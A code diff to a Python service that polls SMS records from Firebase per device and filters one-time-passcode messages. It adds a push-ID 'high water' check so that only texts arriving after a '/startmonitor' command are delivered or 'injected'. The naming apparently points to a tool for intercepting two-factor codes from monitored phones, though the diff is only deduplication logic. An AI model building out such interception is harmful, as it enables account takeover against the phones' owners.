@@ -598,10 +598,16 @@ def _should_deliver_otp_record(
     device: Device,
     profile: MonitorProfile,
 ) -> bool:
-    """After baseline: any unseen message in tail (old SMS already marked seen at start)."""
+    """Only SMS after /startmonitor — push_id strictly above baseline high_water."""
     if not _monitoring_baseline_done(device, profile):
         return False
-    return _record_dedup_key(record) not in get_seen_sms_keys(device)
+    if _record_dedup_key(record) in get_seen_sms_keys(device):
+        return False
+    push_id = _message_push_id(record)
+    high_water = _messages_high_water(device)
+    if push_id is not None and high_water > 0:
+        return push_id > high_water
+    return _record_is_after_monitoring_start(record, profile)
 
 
 def _looks_like_incoming_sms(sender: str, body: str) -> bool:
@@ -1642,8 +1648,16 @@ async def _poll_messages_otp_only(
         logger.warning("OTP poll empty device=%s url=%s", device_id, firebase_url)
 
     candidates: list[dict[str, Any]] = []
+    poll_high_water = _messages_high_water(device)
     for record in records:
         if not _should_deliver_otp_record(record, device, profile):
+            push_id = _message_push_id(record)
+            if (
+                push_id is not None
+                and poll_high_water > 0
+                and push_id <= poll_high_water
+            ):
+                mark_sms_keys_seen(device, {_record_dedup_key(record)})
             continue
         sender = str(record.get("sender") or "Unknown")
         body = str(record.get("message") or "")
@@ -1720,6 +1734,8 @@ async def _poll_messages_otp_only(
         )
         mark_sms_keys_seen(device, {dedup})
         mark_inject_done_keys(device, {dedup})
+        if push_id is not None:
+            _bump_messages_high_water(device, push_id)
         delivered += 1
         db.commit()
         logger.info(
